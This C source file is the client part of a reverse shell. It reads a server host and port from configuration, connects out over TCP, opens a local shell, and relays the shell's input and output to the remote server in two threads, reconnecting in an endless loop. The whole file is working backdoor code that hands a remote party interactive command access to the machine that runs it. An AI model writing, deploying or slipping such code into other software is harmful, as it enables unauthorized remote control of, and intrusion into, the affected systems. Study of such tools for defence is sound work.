#include "config.h"
#include "fd.h"
#include "shell.h"
#include "tcp.h"

#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

Shell shell;
socket_t server = -1;

/**
 *  Read server's input and send it to the shell's stdin
 */
void *
shell_stdin_from_server(void *_)
{
    char store[FD_CHUNK_SIZE];

    while (1)
    {
        memset(store, 0x00, FD_CHUNK_SIZE);

        if (!fd_read(server, store))
        {
            puts("Server's stream ended...");
            break;
        }

        fd_write(shell.stdin, store);
        fd_write(shell.stdin, "\n");
    }

    puts("Exiting reading...");

    shell_close(shell);
    pthread_exit(NULL);
    return NULL;
}

/**
 *  Read shell's output and send it to the server
 */
void *
shell_stdout_to_server(void *_)
{
    char store[FD_CHUNK_SIZE];

    while (1)
    {
        memset(store, 0x00, FD_CHUNK_SIZE);

        if (!fd_read(shell.stdout, store))
        {
            break;
        }

        fd_write(server, store);
    }

    puts("Exiting writing...");

    shell_close(shell);
    tcp_annihilate_socket(server);
    pthread_exit(NULL);
    return NULL;
}

/**
 *  Open a shell and creating tunel beetween server and client endpoints
 */
void
use_shell()
{
    shell = shell_open();
    puts("Done opening the shell");

    pthread_t thread_recv;
    if (pthread_create(&thread_recv, NULL, shell_stdin_from_server, NULL) != 0)
    {
        puts("Failed to create receiver thread.");
        return;
    }

    pthread_t thread_push;
    if (pthread_create(&thread_push, NULL, shell_stdout_to_server, NULL) != 0)
    {
        puts("Failed to create pusher thread.");
        return;
    }

    pthread_join(thread_recv, NULL);
    pthread_join(thread_push, NULL);
}

int
main(int argc, char **argv)
{
    char *host;
    int port;

    config_update();

    host = CONFIG_ENSURE("server_host");
    port = atoi(CONFIG_ENSURE("server_port"));

    while (1)
    {
        puts("Try opening a socket connection...");
        server = tcp_open(host, port);

        puts("Connection established!");
        puts("Opening the shell...");

        use_shell();
    }

    return 0;
}
